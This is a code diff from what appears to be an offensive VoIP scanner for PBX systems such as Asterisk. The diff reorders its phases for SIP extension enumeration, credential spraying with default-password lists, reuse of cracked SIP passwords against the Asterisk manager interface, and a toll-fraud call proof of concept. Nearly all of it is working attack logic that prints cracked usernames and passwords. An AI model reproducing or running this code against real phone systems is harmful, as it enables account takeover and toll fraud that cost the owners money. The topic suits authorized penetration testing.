@@ -679,279 +679,12 @@ def main() -> int:
                 _info("Asterisk HTTP API not found on this host.", col)
 
         # ══════════════════════════════════════════════════════════════════
-        _phase(f"PHASE 4 · EXTENSION ENUMERATION  [{h.ip}]", col)
+        _phase(f"PHASE 4 · TOLL-FRAUD CALL POC  [{h.ip}]", col)
 
         if not h.sip:
             _warn(f"{h.ip}: no SIP response — skipping extension enumeration, spray, and call PoC.", col)
             host_reports.append(hr)
             continue
-
-        ami_dumped_exts: list[str] = (hr.get("ami") or {}).get("extensions") or []
-
-        # In --auto mode, use platform-specific extension ranges after fingerprinting
-        if args.auto and not args.ext_range and ami_dumped_exts == []:
-            auto_ranges = enumeration.ranges_for_fingerprint(h.fingerprint)
-            _info(
-                f"AUTO mode: using platform-specific ranges for {h.fingerprint}: {auto_ranges}",
-                col,
-            )
-
-        if args.enum:
-            if ami_dumped_exts:
-                # AMI gave us ground truth — skip wordlist
-                ext_list = ami_dumped_exts
-                _info(f"Using {len(ext_list)} extensions from AMI dump (skip wordlist sweep).", col)
-                _jitter_sleep(args.jitter)
-                found = enumeration.sweep(
-                    h.ip, ext_list, port=sip_port,
-                    timeout=args.timeout, max_workers=args.workers,
-                    traffic_log=traffic_log,
-                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
-                )
-            elif args.ext_range:
-                ext_list = enumeration.expand_ext_range(args.ext_range)
-                _info(f"Enumerating {len(ext_list)} extensions from --ext-range...", col)
-                prog = Progress("REGISTER sweep", len(ext_list), col)
-                _jitter_sleep(args.jitter)
-                found = enumeration.sweep(
-                    h.ip, ext_list, port=sip_port,
-                    timeout=args.timeout, max_workers=args.workers,
-                    traffic_log=traffic_log, progress_cb=prog.tick,
-                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
-                )
-                prog.close()
-            else:
-                # Auto-select ranges based on fingerprint (full mode) or wordlist
-                if args.full:
-                    ranges = enumeration.ranges_for_fingerprint(h.fingerprint)
-                    found_all: list[enumeration.ExtensionResult] = []
-                    seen_exts: set[str] = set()
-
-                    # Pass 1: special / feature-code extensions
-                    specials = enumeration.SPECIAL_EXTENSIONS[:]
-                    _jitter_sleep(args.jitter)
-                    sf = enumeration.sweep(
-                        h.ip, specials, port=sip_port,
-                        timeout=args.timeout, max_workers=args.workers,
-                        traffic_log=traffic_log,
-                        source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
-                    )
-                    for r in sf:
-                        if r.extension not in seen_exts:
-                            seen_exts.add(r.extension)
-                            found_all.append(r)
-                    if sf:
-                        _ok(f"Special extensions: {[r.extension for r in sf]}", col)
-
-                    # Pass 2: priority extensions — 1000+ most common across all
-                    # brands, probed before the adaptive sweep to surface hits fast
-                    prio_path = os.path.join(
-                        os.path.dirname(__file__),
-                        "wordlists", "extensions_priority.txt"
-                    )
-                    if os.path.exists(prio_path):
-                        with open(prio_path) as _pf:
-                            prio_list = [
-                                ln.strip() for ln in _pf
-                                if ln.strip() and not ln.startswith("#")
-                                and ln.strip() not in seen_exts
-                            ]
-                        _info(f"Priority sweep: {len(prio_list)} common extensions "
-                              f"({h.fingerprint} platform)...", col)
-                        prog = Progress("Priority sweep", len(prio_list), col)
-                        _jitter_sleep(args.jitter)
-                        pf = enumeration.sweep(
-                            h.ip, prio_list, port=sip_port,
-                            timeout=args.timeout, max_workers=args.workers,
-                            traffic_log=traffic_log, progress_cb=prog.tick,
-                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
-                        )
-                        prog.close()
-                        for r in pf:
-                            if r.extension not in seen_exts:
-                                seen_exts.add(r.extension)
-                                found_all.append(r)
-                        if pf:
-                            _ok(f"Priority hits: {[r.extension for r in pf]}", col)
-
-                    # Pass 3: adaptive sweep over 100-5000 to fill gaps
-                    _info(f"Fingerprint: {h.fingerprint} — adaptive sweep "
-                          f"over ranges {ranges} (filling gaps)...", col)
-                    for (lo, hi) in ranges:
-                        total_coarse = (hi - lo) // 10 + 1
-                        _info(f"Adaptive sweep {lo}–{hi} (~{total_coarse} coarse probes)...", col)
-                        prog = Progress(f"{lo}-{hi}", total_coarse, col)
-                        _jitter_sleep(args.jitter)
-                        batch = enumeration.adaptive_sweep(
-                            h.ip, port=sip_port, low=lo, high=hi,
-                            timeout=args.timeout, max_workers=args.workers,
-                            traffic_log=traffic_log, progress_cb=prog.tick,
-                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
-                        )
-                        prog.close()
-                        for r in batch:
-                            if r.extension not in seen_exts:
-                                seen_exts.add(r.extension)
-                                found_all.append(r)
-
-                    found = found_all
-                else:
-                    ext_list = enumeration.expand_ext_range(f"file:{args.ext_wordlist}")
-                    _info(f"Enumerating {len(ext_list)} extensions from wordlist...", col)
-                    prog = Progress("REGISTER sweep", len(ext_list), col)
-                    _jitter_sleep(args.jitter)
-                    found = enumeration.sweep(
-                        h.ip, ext_list, port=sip_port,
-                        timeout=args.timeout, max_workers=args.workers,
-                        traffic_log=traffic_log, progress_cb=prog.tick,
-                        source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
-                    )
-                    prog.close()
-
-            # INVITE-probe found extensions for anonymous-call acceptance
-            if found:
-                _info(f"INVITE-probing {len(found)} extensions for anonymous-call acceptance...", col)
-                prog2 = Progress("INVITE probe", len(found), col)
-                _jitter_sleep(args.jitter)
-                inv_map = enumeration.probe_invite_acceptance(
-                    h.ip, [r.extension for r in found], port=sip_port,
-                    timeout=args.timeout, max_workers=args.workers,
-                    traffic_log=traffic_log, progress_cb=prog2.tick,
-                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
-                )
-                prog2.close()
-                for r in found:
-                    inv = inv_map.get(r.extension)
-                    if inv:
-                        r.anonymous_invite = r.anonymous_invite or inv.anonymous_invite
-                        r.auth_required = r.auth_required and inv.auth_required
-
-            hr["extensions"] = [asdict(x) for x in found]
-            anon = sum(1 for x in found if x.anonymous_invite)
-            open_reg = sum(1 for x in found if x.open_register)
-            _ok(f"{len(found)} extension(s) found — "
-                f"auth_required:{len(found)-anon}  "
-                f"anonymous_invite:{col.RED if anon else ''}{anon}{col.RESET if anon else ''}  "
-                f"open_register:{col.RED if open_reg else ''}{open_reg}{col.RESET if open_reg else ''}",
-                col)
-            for r in found:
-                flags = []
-                if r.anonymous_invite:
-                    flags.append(f"{col.RED}anon-invite{col.RESET}")
-                if r.open_register:
-                    flags.append(f"{col.RED}open-register{col.RESET}")
-                if r.auth_required:
-                    flags.append("auth-required")
-                _info(f"  ext {col.BOLD}{r.extension}{col.RESET}  " + "  ".join(flags), col)
-            if not found and args.call_test:
-                _warn("0 extensions enumerated — PBX may suppress REGISTER probes or use "
-                      "a non-standard range. Phase 6 will probe for ANONYMOUS DIAL-OUT: "
-                      "whether the PBX routes PSTN calls from completely unknown/unregistered "
-                      "extensions with no credentials.", col)
-
-        # ══════════════════════════════════════════════════════════════════
-        _phase(f"PHASE 5 · CREDENTIAL SPRAY  [{h.ip}]", col)
-
-        if args.spray and hr["extensions"]:
-            creds = auth.load_credentials(args.cred_file)
-            if args.grandstream_creds or h.fingerprint == "Grandstream":
-                gs_path = os.path.join(os.path.dirname(args.cred_file), "grandstream.txt")
-                if os.path.exists(gs_path):
-                    creds.extend(auth.load_credentials(gs_path))
-            targets_for_spray = [e["extension"] for e in hr["extensions"]
-                                  if e.get("auth_required")]
-            if targets_for_spray:
-                total_attempts = len(creds) * len(targets_for_spray)
-                _info(f"Spraying {len(creds)} cred pairs × {len(targets_for_spray)} "
-                      f"extension(s) = {total_attempts} attempts (max-failures={args.max_failures_per_ext})...", col)
-                prog = Progress("Spray", len(targets_for_spray), col)
-                _jitter_sleep(args.jitter)
-                ami_pwds = []
-                if hr.get("ami") and hr["ami"].get("success") and hr["ami"].get("password"):
-                    ami_pwds = [hr["ami"]["password"]]
-                hits_spray = auth.spray(
-                    h.ip, targets_for_spray, creds,
-                    port=sip_port, timeout=args.timeout,
-                    max_workers=min(args.workers, 10),
-                    max_failures_per_ext=args.max_failures_per_ext,
-                    traffic_log=traffic_log,
-                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
-                    ami_cracked_passwords=ami_pwds,
-                )
-                prog.close()
-                successes = [asdict(c) for c in hits_spray if c.success]
-                hr["credentials_found"] = successes
-                if successes:
-                    for c in successes:
-                        _finding("critical",
-                                 f"Cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
-                                 f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
-                                 col)
-                else:
-                    _info("No credentials cracked.", col)
-
-                # Credential reuse: try cracked SIP passwords against AMI
-                if successes and hr.get("ami") and not hr["ami"].get("success"):
-                    _sip_passwords = list({c["password"] for c in successes if c.get("password")})
-                    if _sip_passwords:
-                        _info(f"Credential reuse: trying {len(_sip_passwords)} cracked SIP password(s) against AMI...", col)
-                        from scanner import ami as _ami
-                        for _pwd in _sip_passwords[:5]:
-                            for _user in ["admin", "asterisk", successes[0].get("username", "admin")]:
-                                _reuse = _ami.try_login(h.ip, _user, _pwd, port=5038, timeout=args.timeout)
-                                if _reuse and _reuse.get("success"):
-                                    _warn(f"AMI credential reuse: SIP password '{_pwd}' works on AMI as '{_user}'!", col)
-                                    hr["ami"]["reuse_hit"] = {"username": _user, "password": _pwd}
-                                    _finding("critical", f"CREDENTIAL REUSE: SIP password '{_pwd}' grants AMI access as '{_user}' — full PBX control", col)
-                                    break
-
-                # --auto: also try INVITE-based auth spray for extensions that only
-                # challenge INVITE (some PBXes skip REGISTER challenge)
-                if args.auto and not successes:
-                    invite_auth_exts = [
-                        e["extension"] for e in hr["extensions"]
-                        if e.get("auth_required")
-                    ]
-                    if invite_auth_exts:
-                        _info(
-                            f"AUTO mode: trying INVITE-based auth spray on "
-                            f"{len(invite_auth_exts)} extension(s) "
-                            f"(some PBXes only challenge INVITE, not REGISTER)...",
-                            col,
-                        )
-                        _jitter_sleep(args.jitter)
-                        try:
-                            invite_hits = auth.spray(
-                                h.ip, invite_auth_exts, creds,
-                                port=sip_port, timeout=args.timeout,
-                                max_workers=min(args.workers, 10),
-                                max_failures_per_ext=args.max_failures_per_ext,
-                                traffic_log=traffic_log,
-                                source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
-                                method="INVITE",
-                            )
-                            invite_successes = [asdict(c) for c in invite_hits if c.success]
-                            if invite_successes:
-                                hr["credentials_found"].extend(invite_successes)
-                                for c in invite_successes:
-                                    _finding(
-                                        "critical",
-                                        f"INVITE spray cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
-                                        f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
-                                        col,
-                                    )
-                            else:
-                                _info("INVITE-based auth spray: no additional credentials found.", col)
-                        except TypeError:
-                            # auth.spray() may not support method= in all builds
-                            _info("INVITE auth spray not supported in this build — skipping.", col)
-            else:
-                _info("No auth-required extensions to spray.", col)
-        elif args.spray:
-            _info("No extensions found — skipping credential spray.", col)
-
-        # ══════════════════════════════════════════════════════════════════
-        _phase(f"PHASE 6 · TOLL-FRAUD CALL POC  [{h.ip}]", col)
 
         # --auto with no --call-to but creds found: hint the operator
         if args.auto and not args.call_to and hr["credentials_found"]:
@@ -1178,6 +911,277 @@ def main() -> int:
                 _finding("medium",
                          "SRTP downgrade: PBX silently accepted cleartext media when SRTP was offered",
                          col)
+
+
+        # ══════════════════════════════════════════════════════════════════
+        _phase(f"PHASE 5 · EXTENSION ENUMERATION  [{h.ip}]", col)
+
+        ami_dumped_exts: list[str] = (hr.get("ami") or {}).get("extensions") or []
+
+        # In --auto mode, use platform-specific extension ranges after fingerprinting
+        if args.auto and not args.ext_range and ami_dumped_exts == []:
+            auto_ranges = enumeration.ranges_for_fingerprint(h.fingerprint)
+            _info(
+                f"AUTO mode: using platform-specific ranges for {h.fingerprint}: {auto_ranges}",
+                col,
+            )
+
+        if args.enum:
+            if ami_dumped_exts:
+                # AMI gave us ground truth — skip wordlist
+                ext_list = ami_dumped_exts
+                _info(f"Using {len(ext_list)} extensions from AMI dump (skip wordlist sweep).", col)
+                _jitter_sleep(args.jitter)
+                found = enumeration.sweep(
+                    h.ip, ext_list, port=sip_port,
+                    timeout=args.timeout, max_workers=args.workers,
+                    traffic_log=traffic_log,
+                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                )
+            elif args.ext_range:
+                ext_list = enumeration.expand_ext_range(args.ext_range)
+                _info(f"Enumerating {len(ext_list)} extensions from --ext-range...", col)
+                prog = Progress("REGISTER sweep", len(ext_list), col)
+                _jitter_sleep(args.jitter)
+                found = enumeration.sweep(
+                    h.ip, ext_list, port=sip_port,
+                    timeout=args.timeout, max_workers=args.workers,
+                    traffic_log=traffic_log, progress_cb=prog.tick,
+                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                )
+                prog.close()
+            else:
+                # Auto-select ranges based on fingerprint (full mode) or wordlist
+                if args.full:
+                    ranges = enumeration.ranges_for_fingerprint(h.fingerprint)
+                    found_all: list[enumeration.ExtensionResult] = []
+                    seen_exts: set[str] = set()
+
+                    # Pass 1: special / feature-code extensions
+                    specials = enumeration.SPECIAL_EXTENSIONS[:]
+                    _jitter_sleep(args.jitter)
+                    sf = enumeration.sweep(
+                        h.ip, specials, port=sip_port,
+                        timeout=args.timeout, max_workers=args.workers,
+                        traffic_log=traffic_log,
+                        source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                    )
+                    for r in sf:
+                        if r.extension not in seen_exts:
+                            seen_exts.add(r.extension)
+                            found_all.append(r)
+                    if sf:
+                        _ok(f"Special extensions: {[r.extension for r in sf]}", col)
+
+                    # Pass 2: priority extensions — 1000+ most common across all
+                    # brands, probed before the adaptive sweep to surface hits fast
+                    prio_path = os.path.join(
+                        os.path.dirname(__file__),
+                        "wordlists", "extensions_priority.txt"
+                    )
+                    if os.path.exists(prio_path):
+                        with open(prio_path) as _pf:
+                            prio_list = [
+                                ln.strip() for ln in _pf
+                                if ln.strip() and not ln.startswith("#")
+                                and ln.strip() not in seen_exts
+                            ]
+                        _info(f"Priority sweep: {len(prio_list)} common extensions "
+                              f"({h.fingerprint} platform)...", col)
+                        prog = Progress("Priority sweep", len(prio_list), col)
+                        _jitter_sleep(args.jitter)
+                        pf = enumeration.sweep(
+                            h.ip, prio_list, port=sip_port,
+                            timeout=args.timeout, max_workers=args.workers,
+                            traffic_log=traffic_log, progress_cb=prog.tick,
+                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                        )
+                        prog.close()
+                        for r in pf:
+                            if r.extension not in seen_exts:
+                                seen_exts.add(r.extension)
+                                found_all.append(r)
+                        if pf:
+                            _ok(f"Priority hits: {[r.extension for r in pf]}", col)
+
+                    # Pass 3: adaptive sweep over 100-5000 to fill gaps
+                    _info(f"Fingerprint: {h.fingerprint} — adaptive sweep "
+                          f"over ranges {ranges} (filling gaps)...", col)
+                    for (lo, hi) in ranges:
+                        total_coarse = (hi - lo) // 10 + 1
+                        _info(f"Adaptive sweep {lo}–{hi} (~{total_coarse} coarse probes)...", col)
+                        prog = Progress(f"{lo}-{hi}", total_coarse, col)
+                        _jitter_sleep(args.jitter)
+                        batch = enumeration.adaptive_sweep(
+                            h.ip, port=sip_port, low=lo, high=hi,
+                            timeout=args.timeout, max_workers=args.workers,
+                            traffic_log=traffic_log, progress_cb=prog.tick,
+                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                        )
+                        prog.close()
+                        for r in batch:
+                            if r.extension not in seen_exts:
+                                seen_exts.add(r.extension)
+                                found_all.append(r)
+
+                    found = found_all
+                else:
+                    ext_list = enumeration.expand_ext_range(f"file:{args.ext_wordlist}")
+                    _info(f"Enumerating {len(ext_list)} extensions from wordlist...", col)
+                    prog = Progress("REGISTER sweep", len(ext_list), col)
+                    _jitter_sleep(args.jitter)
+                    found = enumeration.sweep(
+                        h.ip, ext_list, port=sip_port,
+                        timeout=args.timeout, max_workers=args.workers,
+                        traffic_log=traffic_log, progress_cb=prog.tick,
+                        source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                    )
+                    prog.close()
+
+            # INVITE-probe found extensions for anonymous-call acceptance
+            if found:
+                _info(f"INVITE-probing {len(found)} extensions for anonymous-call acceptance...", col)
+                prog2 = Progress("INVITE probe", len(found), col)
+                _jitter_sleep(args.jitter)
+                inv_map = enumeration.probe_invite_acceptance(
+                    h.ip, [r.extension for r in found], port=sip_port,
+                    timeout=args.timeout, max_workers=args.workers,
+                    traffic_log=traffic_log, progress_cb=prog2.tick,
+                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                )
+                prog2.close()
+                for r in found:
+                    inv = inv_map.get(r.extension)
+                    if inv:
+                        r.anonymous_invite = r.anonymous_invite or inv.anonymous_invite
+                        r.auth_required = r.auth_required and inv.auth_required
+
+            hr["extensions"] = [asdict(x) for x in found]
+            anon = sum(1 for x in found if x.anonymous_invite)
+            open_reg = sum(1 for x in found if x.open_register)
+            _ok(f"{len(found)} extension(s) found — "
+                f"auth_required:{len(found)-anon}  "
+                f"anonymous_invite:{col.RED if anon else ''}{anon}{col.RESET if anon else ''}  "
+                f"open_register:{col.RED if open_reg else ''}{open_reg}{col.RESET if open_reg else ''}",
+                col)
+            for r in found:
+                flags = []
+                if r.anonymous_invite:
+                    flags.append(f"{col.RED}anon-invite{col.RESET}")
+                if r.open_register:
+                    flags.append(f"{col.RED}open-register{col.RESET}")
+                if r.auth_required:
+                    flags.append("auth-required")
+                _info(f"  ext {col.BOLD}{r.extension}{col.RESET}  " + "  ".join(flags), col)
+            if not found and args.call_test:
+                _warn("0 extensions enumerated — PBX may suppress REGISTER probes or use "
+                      "a non-standard range. Phase 6 will probe for ANONYMOUS DIAL-OUT: "
+                      "whether the PBX routes PSTN calls from completely unknown/unregistered "
+                      "extensions with no credentials.", col)
+
+
+        # ══════════════════════════════════════════════════════════════════
+        _phase(f"PHASE 6 · CREDENTIAL SPRAY  [{h.ip}]", col)
+
+
+        if args.spray and hr["extensions"]:
+            creds = auth.load_credentials(args.cred_file)
+            if args.grandstream_creds or h.fingerprint == "Grandstream":
+                gs_path = os.path.join(os.path.dirname(args.cred_file), "grandstream.txt")
+                if os.path.exists(gs_path):
+                    creds.extend(auth.load_credentials(gs_path))
+            targets_for_spray = [e["extension"] for e in hr["extensions"]
+                                  if e.get("auth_required")]
+            if targets_for_spray:
+                total_attempts = len(creds) * len(targets_for_spray)
+                _info(f"Spraying {len(creds)} cred pairs × {len(targets_for_spray)} "
+                      f"extension(s) = {total_attempts} attempts (max-failures={args.max_failures_per_ext})...", col)
+                prog = Progress("Spray", len(targets_for_spray), col)
+                _jitter_sleep(args.jitter)
+                ami_pwds = []
+                if hr.get("ami") and hr["ami"].get("success") and hr["ami"].get("password"):
+                    ami_pwds = [hr["ami"]["password"]]
+                hits_spray = auth.spray(
+                    h.ip, targets_for_spray, creds,
+                    port=sip_port, timeout=args.timeout,
+                    max_workers=min(args.workers, 10),
+                    max_failures_per_ext=args.max_failures_per_ext,
+                    traffic_log=traffic_log,
+                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                    ami_cracked_passwords=ami_pwds,
+                )
+                prog.close()
+                successes = [asdict(c) for c in hits_spray if c.success]
+                hr["credentials_found"] = successes
+                if successes:
+                    for c in successes:
+                        _finding("critical",
+                                 f"Cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
+                                 f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
+                                 col)
+                else:
+                    _info("No credentials cracked.", col)
+
+                # Credential reuse: try cracked SIP passwords against AMI
+                if successes and hr.get("ami") and not hr["ami"].get("success"):
+                    _sip_passwords = list({c["password"] for c in successes if c.get("password")})
+                    if _sip_passwords:
+                        _info(f"Credential reuse: trying {len(_sip_passwords)} cracked SIP password(s) against AMI...", col)
+                        from scanner import ami as _ami
+                        for _pwd in _sip_passwords[:5]:
+                            for _user in ["admin", "asterisk", successes[0].get("username", "admin")]:
+                                _reuse = _ami.try_login(h.ip, _user, _pwd, port=5038, timeout=args.timeout)
+                                if _reuse and _reuse.get("success"):
+                                    _warn(f"AMI credential reuse: SIP password '{_pwd}' works on AMI as '{_user}'!", col)
+                                    hr["ami"]["reuse_hit"] = {"username": _user, "password": _pwd}
+                                    _finding("critical", f"CREDENTIAL REUSE: SIP password '{_pwd}' grants AMI access as '{_user}' — full PBX control", col)
+                                    break
+
+                # --auto: also try INVITE-based auth spray for extensions that only
+                # challenge INVITE (some PBXes skip REGISTER challenge)
+                if args.auto and not successes:
+                    invite_auth_exts = [
+                        e["extension"] for e in hr["extensions"]
+                        if e.get("auth_required")
+                    ]
+                    if invite_auth_exts:
+                        _info(
+                            f"AUTO mode: trying INVITE-based auth spray on "
+                            f"{len(invite_auth_exts)} extension(s) "
+                            f"(some PBXes only challenge INVITE, not REGISTER)...",
+                            col,
+                        )
+                        _jitter_sleep(args.jitter)
+                        try:
+                            invite_hits = auth.spray(
+                                h.ip, invite_auth_exts, creds,
+                                port=sip_port, timeout=args.timeout,
+                                max_workers=min(args.workers, 10),
+                                max_failures_per_ext=args.max_failures_per_ext,
+                                traffic_log=traffic_log,
+                                source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                                method="INVITE",
+                            )
+                            invite_successes = [asdict(c) for c in invite_hits if c.success]
+                            if invite_successes:
+                                hr["credentials_found"].extend(invite_successes)
+                                for c in invite_successes:
+                                    _finding(
+                                        "critical",
+                                        f"INVITE spray cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
+                                        f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
+                                        col,
+                                    )
+                            else:
+                                _info("INVITE-based auth spray: no additional credentials found.", col)
+                        except TypeError:
+                            # auth.spray() may not support method= in all builds
+                            _info("INVITE auth spray not supported in this build — skipping.", col)
+            else:
+                _info("No auth-required extensions to spray.", col)
+        elif args.spray:
+            _info("No extensions found — skipping credential spray.", col)
+
 
         host_reports.append(hr)
 
